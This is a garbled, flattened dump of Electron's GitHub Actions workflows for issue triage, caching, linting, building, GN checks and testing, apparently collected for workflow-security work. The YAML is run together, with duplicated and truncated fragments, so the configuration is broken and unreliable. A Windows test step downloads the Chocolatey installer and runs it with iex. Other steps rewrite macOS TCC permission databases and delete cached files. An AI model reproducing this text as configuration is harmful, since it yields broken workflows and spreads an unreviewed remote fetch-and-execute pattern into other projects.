-arm64]always() && !contains(needs.*.result, 'failure')always( ... ilure')GitHub Actions Jobs DoneGitHub  ... bs Doneecho "All GitHub Actions Jobs are done"
name: G ... bs Done- name: ... bs Donename: G ... mpletedsetup:/home/huawei/github-actions-security/.github/workflows/electron_electron__clean-src-cache.ymlClean Source CacheThis workflow cleans up the source cache on the cross-instance cache volume
to free up space. It runs daily at midnight and clears files older than 15 days.
0 0 * * *"0 0 * * *"cron: "0 0 * * *"- cron: "0 0 * * *"clean-src-cacheghcr.io/electron/build:bc2f48b2415a670de18d13605b1cf0eb5fdbaae1ghcr.io ... fdbaae1image:  ... fdbaae1Cleanup Source Cachedf -h /mnt/cross-instance-cache
find /mnt/cross-instance-cache -type f -mtime +15 -delete
df -h /mnt/cross-instance-cache
df -h /mnt/win-cache
find /mnt/win-cache -type f -mtime +15 -delete
df -h /mnt/win-cache
name: C ... e Cache- name: ... e Cacheruns-on ... -32coreclean-src-cache:/home/huawei/github-actions-security/.github/workflows/electron_electron__issue-commented.ymlIssue Commented- createdissue-commentedRemove blocked/{need-info,need-repro} on commentRemove  ... comment${{ (contains(github.event.issue.labels.*.name, 'blocked/need-repro') || contains(github.event.issue.labels.*.name, 'blocked/need-info âŒ')) && !contains(fromJSON('["MEMBER", "OWNER", "COLLABORATOR"]'), github.event.comment.author_association) && github.event.comment.user.type != 'Bot' }}${{ (co ... Bot' }}${{ secrets.ISSUE_TRIAGE_GH_APP_CREDS }}Remove labelISSUE_URL${{ github.event.issue.html_url }}${{ git ... _url }}gh issue edit $ISSUE_URL --remove-label 'blocked/need-repro','blocked/need-info âŒ'
name: Remove label- name: ... p tokenname: R ... commentissue-commented:name: I ... mmented/home/huawei/github-actions-security/.github/workflows/electron_electron__issue-labeled.ymlIssue Labeledissue-labeled-with-statusissue-l ... -statusstatus/{confirmed,reviewed} label addedstatus/ ... l addedgithub.event.label.name == 'status/confirmed' || github.event.label.name == 'status/reviewed'github. ... viewed'Set statusdsanders11/project-actions/edit-item@2134fe7cc71c58b7ae259c82a8e63c6058255678fieldStatusfield-valueâœ… Triaged\u2705 Triagedfail-if-item-not-foundtoken:  ... oken }}name: Set statusname: s ... l addedissue-labeled-blockedissue-l ... blockedblocked/* label addedblocked ... l addedstartsWith(github.event.label.name, 'blocked/')startsW ... cked/')ðŸ›‘ Blocked\u1f6d1\uded1 Blockedname: b ... l addedissue-labeled-blocked-need-reproissue-l ... d-reproblocked/need-repro label addedgithub.event.label.name == 'blocked/need-repro'github. ... -repro'issues: ...  issuesCheck if comment neededCheck i ...  neededcheck-for-commentset -eo pipefail
COMMENT_COUNT=$(gh issue view ${{ github.event.issue.number }} --comments --json comments | jq '[ .comments[] | select(.author.login == "electron-issue-triage" or .authorAssociation == "OWNER" or .authorAssociation == "MEMBER") | select(.body | startswith("<!-- blocked/need-repro -->")) ] | length')
if [[ $COMMENT_COUNT -eq 0 ]]; then
  echo "SHOULD_COMMENT=1" >> "$GITHUB_OUTPUT"
fi
name: C ...  needed${{ steps.check-for-comment.outputs.SHOULD_COMMENT }}${{ ste ... MENT }}Create commentactions-cool/issues-helper@a610082f8ac0cf03e357eb8dd0d5e2ba075e017eactions ... 75e017ecreate-comment'create-comment'body<!-- blocked/need-repro -->

Hello @${{ github.event.issue.user.login }}. Thanks for reporting this and helping to make Electron better!

Would it be possible for you to make a standalone testcase with only the code necessary to reproduce the issue? For example, [Electron Fiddle](https://www.electronjs.org/fiddle) is a great tool for making small test cases and makes it easy to publish your test case to a [gist](https://gist.github.com) that Electron maintainers can use.

Stand-alone test cases make fixing issues go more smoothly: it ensure everyone's looking at the same issue, it removes all unnecessary variables from the equation, and it can also provide the basis for automated regression tests.

Now adding the https://github.com/electron/electron/labels/blocked%2Fneed-repro label for this reason. After you make a test case, please link to it in a followup comment. This issue will be closed in 10 days if the above is not addressed.
actions ... omment'name: Create comment- name: ...  neededissue-l ... status:name: Issue Labeled/home/huawei/github-actions-security/.github/workflows/electron_electron__issue-opened.ymlIssue Openedadd-to-issue-triage${{ contains(github.event.issue.labels.*.name, 'bug :beetle:') }}${{ con ... e:') }}Add to Issue Triagedsanders11/project-actions/add-item@2134fe7cc71c58b7ae259c82a8e63c6058255678Reporter${{ github.event.issue.user.login }}${{ git ... ogin }}field: Reportername: A ...  Triageif: ${{ ... e:') }}set-labelsnpm install @electron/fiddle-core@1.3.3 mdast-util-from-markdown@2.0.0 unist-util-select@5.1.0 semver@7.6.0npm ins ... r@7.6.0run: np ... r@7.6.0Add labelsadd-labelsISSUE_BODYISSUE_B ... body }}github-tokenconst { fromMarkdown } = await import('${{ github.workspace }}/node_modules/mdast-util-from-markdown/index.js');
const { select } = await import('${{ github.workspace }}/node_modules/unist-util-select/index.js');
const semver = await import('${{ github.workspace }}/node_modules/semver/index.js');

const [ owner, repo ] = '${{ github.repository }}'.split('/');
const issue_number = ${{ github.event.issue.number }};

const tree = fromMarkdown(process.env.ISSUE_BODY);

const labels = [];

const electronVersion = select('heading:has(> text[value="Electron Version"]) + paragraph > text', tree)?.value.trim();
if (electronVersion !== undefined) {
  // It's possible for multiple versions to be listed -
  // for now check for comma or space separated version.
  const versions = electronVersion.split(/, | /);
  for (const version of versions) {
    const major = semver.coerce(version, { loose: true })?.major;
    if (major) {
      const versionLabel = `${major}-x-y`;
      let labelExists = false;

      try {
        await github.rest.issues.getLabel({
          owner,
          repo,
          name: versionLabel,
        });
        labelExists = true;
      } catch {}

      if (labelExists) {
        // Check if it's an unsupported major
        const { ElectronVersions } = await import('${{ github.workspace }}/node_modules/@electron/fiddle-core/dist/index.js');
        const versions = await ElectronVersions.create(undefined, { ignoreCache: true });

        const validVersions = [...versions.supportedMajors, ...versions.prereleaseMajors];
        if (validVersions.includes(major)) {
          labels.push(versionLabel);
        }
      }
    }
  }
  if (labels.length === 0) {
    core.setOutput('unsupportedMajor', true);
    labels.push('blocked/need-info âŒ');
  }
}

const operatingSystems = select('heading:has(> text[value="What operating system(s) are you using?"]) + paragraph > text', tree)?.value.trim().split(', ');
const platformLabels = new Set();
for (const operatingSystem of (operatingSystems ?? [])) {
  switch (operatingSystem) {
    case 'Windows':
      platformLabels.add('platform/windows');
      break;
    case 'macOS':
      platformLabels.add('platform/macOS');
      break;
    case 'Ubuntu':
    case 'Other Linux':
      platformLabels.add('platform/linux');
      break;
  }
}

if (platformLabels.size === 3) {
  labels.push('platform/all');
} else {
  labels.push(...platformLabels);
}

const gistUrl = select('heading:has(> text[value="Testcase Gist URL"]) + paragraph > text', tree)?.value.trim();
if (gistUrl !== undefined && gistUrl.startsWith('https://gist.github.com/')) {
  labels.push('has-repro-gist');
}

if (labels.length) {
  await github.rest.issues.addLabels({
    owner,
    repo,
    issue_number,
    labels,
  });
}
github- ... oken }}name: Add labelsCreate unsupported major commentCreate  ... comment${{ steps.add-labels.outputs.unsupportedMajor }}${{ ste ... ajor }}<!-- end-of-life -->

Hello @${{ github.event.issue.user.login }}. Thanks for reporting this and helping to make Electron better!

The version of Electron reported in this issue has reached end-of-life and is [no longer supported](https://www.electronjs.org/docs/latest/tutorial/electron-timelines#timeline). If you're still experiencing this issue on a [supported version](https://www.electronjs.org/releases/stable) of Electron, please update this issue to reflect that version of Electron.

Now adding the https://github.com/electron/electron/labels/blocked%2Fneed-info%20%E2%9D%8C label for this reason. This issue will be closed in 10 days if the above is not addressed.
name: C ... commentadd-to-issue-triage:name: Issue Opened/home/huawei/github-actions-security/.github/workflows/electron_electron__issue-transferred.ymlIssue Transferredtransferred[transferred]types: [transferred]issue-transferred${{ !github.event.changes.new_repository.private }}${{ !gi ... vate }}Remove from issue triageRemove  ...  triagedsanders11/project-actions/delete-item@2134fe7cc71c58b7ae259c82a8e63c6058255678item${{ github.event.changes.new_issue.html_url }}name: R ...  triagename: I ... sferredissue-transferred:/home/huawei/github-actions-security/.github/workflows/electron_electron__issue-unlabeled.ymlIssue Unlabeledunlabeled[unlabeled]types: [unlabeled]issue-unlabeled-blockedissue-u ... blockedAll blocked/* labels removedAll blo ... removedstartsWith(github.event.label.name, 'blocked/') && github.event.issue.state == 'open'startsW ...  'open'Check for any blocked labelsCheck f ...  labelscheck-for-blocked-labelscheck-f ... -labelsset -eo pipefail
BLOCKED_LABEL_COUNT=$(echo '${{ toJSON(github.event.issue.labels.*.name) }}' | jq '[ .[] | select(startswith("blocked/")) ] | length')
if [[ $BLOCKED_LABEL_COUNT -eq 0 ]]; then
  echo "NOT_BLOCKED=1" >> "$GITHUB_OUTPUT"
fi
name: C ...  labels${{ steps.check-for-blocked-labels.outputs.NOT_BLOCKED }}${{ ste ... CKED }}ðŸ“¥ Was Blocked\u1f4e5\udce5 Was Blocked- name: ...  labelsname: A ... removedissue-u ... locked:name: I ... labeled/home/huawei/github-actions-security/.github/workflows/electron_electron__linux-publish.ymlPublish LinuxUploads to Azure storage'Upload ... torage'descrip ... torage'run-linux-publishRun the publish jobs vs just the build jobs'Run th ... d jobs'descrip ... d jobs'ghcr.io/electron/build:${{ inputs.build-image-sha }}publish-x64./.github/workflows/pipeline-segment-electron-build.yml./.gith ... ild.ymlproduction-release{"image":"ghcr.io/electron/build:${{ inputs.build-image-sha }}","options":"--user root","volumes":["/mnt/cross-instance-cache:/mnt/cross-instance-cache"]}strip-binaries${{ inputs.upload-to-storage }}${{ inp ... rage }}environ ... releaseuses: . ... ild.ymlpublish-armpublish-arm64checkout-linux:name: Publish Linux/home/huawei/github-actions-security/.github/workflows/electron_electron__macos-publish.ymlPublish MacOSrun-macos-publishpublish-x64-darwintarget-variantpublish-x64-masmaspublish-arm64-darwinpublish-arm64-mascheckout-macos:name: Publish MacOS/home/huawei/github-actions-security/.github/workflows/electron_electron__non-maintainer-dependency-change.ymlCheck for Non-Maintainer Dependency ChangeCheck f ...  Changeyarn.lock'yarn.lock'spec/yarn.lock'spec/yarn.lock'- 'yarn.lock'check-for-non-maintainer-dependency-changecheck-f ... -changeCheck for non-maintainer dependency changeCheck f ...  change${{ !contains(fromJSON('["MEMBER", "OWNER"]'), github.event.pull_request.author_association) && github.event.pull_request.user.type != 'Bot' && !github.event.pull_request.draft }}${{ !co ... raft }}Check for existing reviewCheck f ...  reviewcheck-for-reviewPR_URL${{ github.event.pull_request.html_url }}set -eo pipefail
REVIEW_COUNT=$(gh pr view $PR_URL --json reviews | jq '[ .reviews[] | select(.author.login == "github-actions") | select(.body | startswith("<!-- no-dependency-change -->")) ] | length')
if [[ $REVIEW_COUNT -eq 0 ]]; then
  echo "SHOULD_REVIEW=1" >> "$GITHUB_OUTPUT"
fi
name: C ...  reviewRequest changes${{ steps.check-for-review.outputs.SHOULD_REVIEW }}${{ ste ... VIEW }}printf "<!-- no-dependency-change -->\n\nHello @${{ github.event.pull_request.user.login }}! It looks like this pull request touches one of our dependency files, and per [our contribution policy](https://github.com/electron/electron/blob/main/CONTRIBUTING.md#dependencies-upgrades-policy) we do not accept these types of changes in PRs." | gh pr review $PR_URL -r --body-file=-
name: R ... changes- name: ...  reviewname: C ...  changecheck-f ... change:name: C ...  Change/home/huawei/github-actions-security/.github/workflows/electron_electron__pipeline-electron-build-and-test-and-nan.ymlElectron Build & Test (+ Node + NaN) PipelineElectro ... ipelinePlatform to run on, can be macos, win or linux.'Platfo ... linux.'Arch to build for, can be x64, arm64 or arm'Arch t ... or arm'What host to run the build'What h ...  build'What host to run the tests on'What h ... sts on'JSON container information for aks runs-on'JSON c ... uns-on'{"image":null}'{"image":null}'JSON container information for testing'JSON c ... esting'Whether this build job is a release job'Whethe ... se job'descrip ... se job'The gn build type - testing or release'The gn ... elease'Whether or not to generate symbols'Whethe ... ymbols'descrip ... ymbols'Whether or not to upload build artifacts to external storage'Whethe ... torage'Building the Address Sanitizer (ASan) Linux build'Buildi ...  build'descrip ...  build'target-platform:electron-build-and-test-and-nan-${{ inputs.target-platform }}-${{ inputs.target-arch }}-${{ github.ref_protected == true && github.run_id || github.ref }}electro ... .ref }}${{ github.ref_protected != true }}${{ git ... true }}group:  ... .ref }}${{ inputs.build-runs-on }}${{ inp ... s-on }}${{ inputs.build-container }}${{ inp ... iner }}${{ inputs.target-platform }}${{ inp ... form }}${{ inputs.target-arch }}${{ inp ... arch }}${{ inputs.is-release }}${{ inp ... ease }}${{ inputs.gn-build-type }}${{ inp ... type }}${{ inputs.generate-symbols }}${{ inp ... bols }}build-r ... s-on }}./.github/workflows/pipeline-segment-electron-test.yml${{ inputs.test-runs-on }}${{ inputs.test-container }}target- ... arch }}uses: . ... est.ymlnn-test./.github/workflows/pipeline-segment-node-nan-test.ymlname: E ... ipeline/home/huawei/github-actions-security/.github/workflows/electron_electron__pipeline-electron-build-and-test.ymlElectron Build & Test PipelinePlatform to run on, can be macos, win or linux'Platfo ...  linux'electron-build-and-test-${{ inputs.target-platform }}-${{ inputs.target-arch }}-${{ github.ref_protected == true && github.run_id || github.ref }}${{ inputs.is-asan}}/home/huawei/github-actions-security/.github/workflows/electron_electron__pipeline-electron-docs-only.ymlElectron Docs CompileElectro ... CompileContainer to run the docs-only ts compile in'Contai ... ile in'container:electron-docs-only-${{ github.ref }}Docs Only Compile${{ fromJSON(inputs.container) }}${{ fro ... ner) }}Install Dependencies./src/electron/.github/actions/install-dependencies./src/e ... denciesRun TS/JS compilecd src/electron
node script/yarn create-typescript-definitions
node script/yarn tsc -p tsconfig.default_app.json --noEmit
for f in build/webpack/*.js
do
    out="${f:29}"
    if [ "$out" != "base.js" ]; then
    node script/yarn webpack --config $f --output-filename=$out --output-path=./.tmp --env mode=development
    fi
done
name: R ... compilename: D ... Compiledocs-only:name: E ... Compile/home/huawei/github-actions-security/.github/workflows/electron_electron__pipeline-electron-lint.ymlElectron LintContainer to run lint in'Contai ... int in'electron-lint-${{ github.ref_protected == true && github.run_id || github.ref }}CHROMIU ... IE }}  Set Chromium Git CookieSet Chr ...  Cookie./src/electron/.github/actions/set-chromium-cookie./src/e ... -cookiename: S ...  CookieSetup third_party Depot ToolsSetup t ... t Tools# "depot_tools" has to be checkout into "//third_party/depot_tools" so pylint.py can a "pylintrc" file.
git clone --filter=tree:0 https://chromium.googlesource.com/chromium/tools/depot_tools.git src/third_party/depot_tools
echo "$(pwd)/src/third_party/depot_tools" >> $GITHUB_PATH
name: S ... t ToolsDownload GN Binarychromium_revision="$(grep -A1 chromium_version src/electron/DEPS | tr -d '\n' | cut -d\' -f4)"
gn_version="$(curl -sL "https://chromium.googlesource.com/chromium/src/+/${chromium_revision}/DEPS?format=TEXT" | base64 -d | grep gn_version | head -n1 | cut -d\' -f4)"

cipd ensure -ensure-file - -root . <<-CIPD
\$ServiceURL https://chrome-infra-packages.appspot.com/
@Subdir src/buildtools/linux64
gn/gn/linux-amd64 $gn_version
CIPD

buildtools_path="$(pwd)/src/buildtools"
echo "CHROMIUM_BUILDTOOLS_PATH=$buildtools_path" >> $GITHUB_ENV
name: D ...  BinaryDownload clang-format BinaryDownloa ...  Binarychromium_revision="$(grep -A1 chromium_version src/electron/DEPS | tr -d '\n' | cut -d\' -f4)"

mkdir -p src/buildtools
curl -sL "https://chromium.googlesource.com/chromium/src/+/${chromium_revision}/buildtools/DEPS?format=TEXT" | base64 -d > src/buildtools/DEPS

gclient sync --spec="solutions=[{'name':'src/buildtools','url':None,'deps_file':'DEPS','custom_vars':{'process_deps':True},'managed':False}]"
Run Lint# gn.py tries to find a gclient root folder starting from the current dir.
# When it fails and returns "None" path, the whole script fails. Let's "fix" it.
touch .gclient
# Another option would be to checkout "buildtools" inside the Electron checkout,
# but then we would lint its contents (at least gn format), and it doesn't pass it.

cd src/electron
node script/yarn install --frozen-lockfile
node script/yarn lint
name: Run LintRun Script TypecheckerRun Scr ... checkercd src/electron
node script/yarn tsc -p tsconfig.script.json
name: R ... checkerlint:name: Electron Lint/home/huawei/github-actions-security/.github/workflows/electron_electron__pipeline-segment-electron-build.ymlPipeline Segment - Electron BuildPipelin ... n Buildusing the production or testing environmentusing t ... ronmentdescrip ... ronmentArch to build for, can be x64, arm64, ia32 or armVariant to build for, no effect on non-macOS target platforms. Can be darwin, mas or all.'Varian ... r all.'allStrip the binaries before release (Linux only)'Strip  ...  only)'descrip ...  only)'environment:electron-build-${{ inputs.target-platform }}-${{ inputs.target-arch }}-${{ inputs.target-variant }}-${{ inputs.is-asan }}-${{ github.ref_protected == true && github.run_id || github.ref }}ELECTRON_ARTIFACTS_BLOB_STORAGEELECTRO ... STORAGE${{ secrets.ELECTRON_ARTIFACTS_BLOB_STORAGE }}${{ sec ... RAGE }}ELECTRON_RBE_JWT${{ secrets.ELECTRON_RBE_JWT }}${{ sec ... _JWT }}SUDOWOODO_EXCHANGE_URLSUDOWOO ... NGE_URL${{ secrets.SUDOWOODO_EXCHANGE_URL }}${{ sec ... _URL }}SUDOWOODO_EXCHANGE_TOKENSUDOWOO ... E_TOKEN${{ secrets.SUDOWOODO_EXCHANGE_TOKEN }}${{ inputs.target-platform == 'macos' && '--custom-var=checkout_mac=True --custom-var=host_os=mac' || inputs.target-platform == 'win' && '--custom-var=checkout_win=True' || '--custom-var=checkout_arm=True --custom-var=checkout_arm64=True' }}${{ inp ... rue' }}ELECTRON_OUT_DIRDefault${{ fromJSON(inputs.build-container) }}${{ inputs.environment }}${{ inp ... ment }}TARGET_ARCHTARGET_ ... arch }}Create src dirmkdir src
name: Create src dirFree up space (macOS)Free up ... (macOS)${{ inputs.target-platform == 'macos' }}${{ inp ... cos' }}./src/electron/.github/actions/free-space-macos./src/e ... e-macosname: F ... (macOS)Check disk space after freeing up spaceCheck d ... p spacedf -hname: C ... p spacesrc/electron/yarn.locksrc/ele ... rn.lockInstall AZCopybrew install azcopyname: Install AZCopySet GN_EXTRA_ARGS for LinuxSet GN_ ... r Linux${{ inputs.target-platform == 'linux' }}${{ inp ... nux' }}if [ "${{ inputs.target-arch  }}" = "arm" ]; then
  if [ "${{ inputs.is-release  }}" = true ]; then
    GN_EXTRA_ARGS='target_cpu="arm" build_tflite_with_xnnpack=false symbol_level=1'
  else
    GN_EXTRA_ARGS='target_cpu="arm" build_tflite_with_xnnpack=false'
  fi
elif [ "${{ inputs.target-arch }}" = "arm64" ]; then
  GN_EXTRA_ARGS='target_cpu="arm64" fatal_linker_warnings=false enable_linux_installer=false'
elif [ "${{ inputs.is-asan }}" = true ]; then
  GN_EXTRA_ARGS='is_asan=true'
fi
echo "GN_EXTRA_ARGS=$GN_EXTRA_ARGS" >> $GITHUB_ENV
name: S ... r LinuxInstall Build Tools./src/electron/.github/actions/install-build-tools./src/e ... d-toolsname: I ... d ToolsGenerate DEPS Hashnode src/electron/script/generate-deps-hash.js
DEPSHASH=v1-src-cache-$(cat src/electron/.depshash)
echo "DEPSHASH=$DEPSHASH" >> $GITHUB_ENV
echo "CACHE_PATH=$DEPSHASH.tar" >> $GITHUB_ENV
name: G ... PS HashRestore src cache via AZCopyRestore ...  AZCopy${{ inputs.target-platform != 'linux' }}./src/electron/.github/actions/restore-cache-azcopy./src/e ... -azcopytarget- ... form }}name: R ...  AZCopyRestore src cache via AKSRestore ... via AKS./src/electron/.github/actions/restore-cache-aks./src/e ... che-aksname: R ... via AKSFix Sync./src/electron/.github/actions/fix-sync./src/e ... ix-syncELECTRON_DEPOT_TOOLS_DISABLE_LOGELECTRO ... BLE_LOGELECTRO ... G: truename: Fix SyncInit Build Toolse init -f --root=$(pwd) --out=Default ${{ inputs.gn-build-type }} --import ${{ inputs.gn-build-type }} --target-cpu ${{ inputs.target-arch }}
Run Electron Only HooksRun Ele ... y Hookse d gclient runhooks --spec="solutions=[{'name':'src/electron','url':None,'deps_file':'DEPS','custom_vars':{'process_deps':False},'managed':False}]"
name: R ... y HooksRegenerate DEPS Hash(cd src/electron && git checkout .) && node src/electron/script/generate-deps-hash.js
echo "DEPSHASH=$(cat src/electron/.depshash)" >> $GITHUB_ENV
name: R ... PS HashAdd CHROMIUM_BUILDTOOLS_PATH to envAdd CHR ...  to envecho "CHROMIUM_BUILDTOOLS_PATH=$(pwd)/src/buildtools" >> $GITHUB_ENVecho "C ... HUB_ENVname: A ...  to envSetup Number of Ninja ProcessesSetup N ... ocessesecho "NUMBER_OF_NINJA_PROCESSES=${{ inputs.target-platform != 'macos' && '300' || '200' }}" >> $GITHUB_ENV
name: S ... ocessesBuild Electron${{ inputs.target-platform != 'macos' || (inputs.target-variant == 'all' || inputs.target-variant == 'darwin') }}${{ inp ... in') }}./src/electron/.github/actions/build-electron./src/e ... lectronartifact-platform${{ inputs.target-platform == 'macos' && 'darwin' || inputs.target-platform }}'${{ in ... ase }}''${{ in ... ols }}'${{ inputs.strip-binaries }}'${{ in ... ies }}''${{ in ... age }}'${{ inputs.is-asan }}'${{ in ... san }}'name: Build ElectronSet GN_EXTRA_ARGS for MAS BuildSet GN_ ... S Build${{ inputs.target-platform == 'macos' && (inputs.target-variant == 'all' || inputs.target-variant == 'mas') }}${{ inp ... as') }}echo "MAS_BUILD=true" >> $GITHUB_ENV
GN_EXTRA_ARGS='is_mas_build=true'
echo "GN_EXTRA_ARGS=$GN_EXTRA_ARGS" >> $GITHUB_ENV
name: S ... S BuildBuild Electron (MAS)'mas'step-suffix(mas)'(mas)'name: B ... n (MAS)- name: ... src dirdefaults:name: P ... n Build/home/huawei/github-actions-security/.github/workflows/electron_electron__pipeline-segment-electron-gn-check.ymlPipeline Segment - Electron GN CheckPipelin ... N CheckArchs to check for, can be x64, x86, arm64 or arm space separated'Archs  ... arated'electron-gn-check-${{ inputs.target-platform }}-${{ github.ref }}${{ inputs.target-platform == 'macos' && '--custom-var=checkout_mac=True --custom-var=host_os=mac' || (inputs.target-platform == 'linux' && '--custom-var=checkout_arm=True --custom-var=checkout_arm64=True' || '--custom-var=checkout_win=True') }}${{ inp ... ue') }}ELECTRO ... _JWT }}gn-check${{ inputs.check-runs-on }}${{ fromJSON(inputs.check-container) }}Cleanup disk space on macOSCleanup ... n macOSsudo mkdir -p $TMPDIR/del-target

tmpify() {
  if [ -d "$1" ]; then
    sudo mv "$1" $TMPDIR/del-target/$(echo $1|shasum -a 256|head -n1|cut -d " " -f1)
  fi
}   
tmpify /Library/Developer/CoreSimulator
tmpify ~/Library/Developer/CoreSimulator
sudo rm -rf $TMPDIR/del-target
|   name: C ... n macOSEnable windows toolchainEnable  ... olchain${{ inputs.target-platform == 'win' }}${{ inp ... win' }}echo "ELECTRON_DEPOT_TOOLS_WIN_TOOLCHAIN=1" >> $GITHUB_ENV
name: E ... olchaintarget- ... }      ${{ inputs.target-platform == 'linux' || inputs.target-platform == 'win' }}echo "solutions=[{'name':'src/electron','url':None,'deps_file':'DEPS','custom_vars':{'process_deps':False},'managed':False}]" > tmpgclient
if [ "${{ inputs.target-platform }}" = "win" ]; then
  echo "solutions=[{'name':'src/electron','url':None,'deps_file':'DEPS','custom_vars':{'process_deps':False,'install_sysroot':False,'checkout_win':True},'managed':False}]" > tmpgclient
  echo "target_os=['win']" >> tmpgclient
fi
e d gclient runhooks --gclientfile=tmpgclient

# Fix VS Toolchain
if [ "${{ inputs.target-platform }}" = "win" ]; then
  rm -rf src/third_party/depot_tools/win_toolchain/vs_files
  e d python3 src/build/vs_toolchain.py update --force
fi
Default GN gencd src/electron
git pack-refs
name: Default GN genRun GN Check for ${{ inputs.target-archs }}Run GN  ... rchs }}for target_cpu in ${{ inputs.target-archs }}
do
  e init -f --root=$(pwd) --out=Default ${{ inputs.gn-build-type }} --import ${{ inputs.gn-build-type }} --target-cpu $target_cpu
  cd src
  export GN_EXTRA_ARGS="target_cpu=\"$target_cpu\""
  if [ "${{ inputs.target-platform }}" = "linux" ]; then
    if [ "$target_cpu" = "arm" ]; then
      export GN_EXTRA_ARGS="$GN_EXTRA_ARGS build_tflite_with_xnnpack=false"
    elif [ "$target_cpu" = "arm64" ]; then
      export GN_EXTRA_ARGS="$GN_EXTRA_ARGS fatal_linker_warnings=false enable_linux_installer=false"
    fi
  fi
  if [ "${{ inputs.target-platform }}" = "win" ]; then
    export GN_EXTRA_ARGS="$GN_EXTRA_ARGS use_v8_context_snapshot=true target_os=\"win\""
  fi

  e build --only-gen

  e d gn check out/Default //electron:electron_lib
  e d gn check out/Default //electron:electron_app
  e d gn check out/Default //electron/shell/common:mojo
  e d gn check out/Default //electron/shell/common:plugin

  # Check the hunspell filenames
  node electron/script/gen-hunspell-filenames.js --check
  node electron/script/gen-libc++-filenames.js --check
  cd ..
done
name: R ... rchs }}Wait for active SSH sessionsWait fo ... essionsalways() && !cancelled()always( ... elled()while [ -f /var/.ssh-lock ]
do
  sleep 60
done
name: W ... essionsgn-check:name: P ... N Check/home/huawei/github-actions-security/.github/workflows/electron_electron__pipeline-segment-electron-test.ymlPipeline Segment - Electron TestPipelin ... on Testelectron-test-${{ inputs.target-platform }}-${{ inputs.target-arch }}-${{ inputs.is-asan }}-${{ github.ref_protected == true && github.run_id || github.ref }}${{ fromJSON(inputs.test-container) }}build-type${{ inputs.target-platform == 'macos' && fromJSON('["darwin","mas"]') || (inputs.target-platform == 'win' && fromJSON('["win"]') || fromJSON('["linux"]')) }}${{ inp ... ]')) }}shard${{ inputs.target-platform == 'linux' && fromJSON('[1, 2, 3]') || fromJSON('[1, 2]') }}${{ inp ... 2]') }}build-t ... ]')) }}BUILD_TYPE${{ matrix.build-type }}${{ mat ... type }}ARTIFACT_KEY${{ matrix.build-type }}_${{ inputs.target-arch }}${{ mat ... arch }}BUILD_T ... type }}Fix node20 on arm32 runnersFix nod ... runners${{ inputs.target-arch == 'arm' && inputs.target-platform == 'linux' }}cp $(which node) /mnt/runner-externals/node20/bin/
name: F ... runnersInstall Git on Windows arm64 runnersInstall ... runners${{ inputs.target-arch == 'arm64' && inputs.target-platform == 'win' }}powershellSet-ExecutionPolicy Bypass -Scope Process -Force
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
choco install -y --no-progress git.install --params "'/GitAndUnixToolsOnPath'"
choco install -y --no-progress git
choco install -y --no-progress python --version 3.11.9
choco install -y --no-progress visualstudio2022-workload-vctools --package-parameters "--add Microsoft.VisualStudio.Component.VC.Tools.ARM64"
echo "C:\Program Files\Git\cmd" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
echo "C:\Program Files\Git\bin" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
echo "C:\Python311" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
cp "C:\Python311\python.exe" "C:\Python311\python3.exe"
name: I ... runnersAdd TCC permissions on macOSAdd TCC ... n macOSconfigure_user_tccdb () {
  local values=$1
  local dbPath="$HOME/Library/Application Support/com.apple.TCC/TCC.db"
  local sqlQuery="INSERT OR REPLACE INTO access VALUES($values);"
  sqlite3 "$dbPath" "$sqlQuery"
}

configure_sys_tccdb () {
  local values=$1
  local dbPath="/Library/Application Support/com.apple.TCC/TCC.db"
  local sqlQuery="INSERT OR REPLACE INTO access VALUES($values);"
  sudo sqlite3 "$dbPath" "$sqlQuery"
}

userValuesArray=(
    "'kTCCServiceMicrophone','/usr/local/opt/runner/provisioner/provisioner',1,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1687786159"
    "'kTCCServiceCamera','/usr/local/opt/runner/provisioner/provisioner',1,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1687786159"
    "'kTCCServiceBluetoothAlways','/usr/local/opt/runner/provisioner/provisioner',1,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1687786159"
)
for values in "${userValuesArray[@]}"; do
  # Sonoma and higher have a few extra values
  # Ref: https://github.com/actions/runner-images/blob/main/images/macos/scripts/build/configure-tccdb-macos.sh
  if [ "$OSTYPE" = "darwin23" ]; then
    configure_user_tccdb "$values,NULL,NULL,'UNUSED',${values##*,}"
    configure_sys_tccdb "$values,NULL,NULL,'UNUSED',${values##*,}"
  else
    configure_user_tccdb "$values"
    configure_sys_tccdb "$values"
  fi
done
name: A ... n macOSTurn off the unexpectedly quit dialog on macOSTurn of ... n macOSdefaults write com.apple.CrashReporter DialogType serverdefault ...  servername: T ... n macOSGet Depot Toolsgit config --global core.filemode false
git config --global core.autocrlf false
git config --global branch.autosetuprebase always
git config --global core.fscache true
git config --global core.preloadindex true
git clone --filter=tree:0 https://chromium.googlesource.com/chromium/tools/depot_tools.git
# Ensure depot_tools does not update.
test -d depot_tools && cd depot_tools
touch .disable_auto_update
name: G ... t ToolsAdd Depot Tools to PATHAdd Dep ... to PATHecho "$(pwd)/depot_tools" >> $GITHUB_PATHecho "$ ... UB_PATHname: A ... to PATHLoad ASan specific environment variablesLoad AS ... riables${{ inputs.is-asan == true }}${{ inp ... true }}echo "ARTIFACT_KEY=${{ matrix.build-type }}_${{ inputs.target-arch }}_asan" >> $GITHUB_ENV
echo "DISABLE_CRASH_REPORTER_TESTS=true" >> $GITHUB_ENV
echo "IS_ASAN=true" >> $GITHUB_ENV
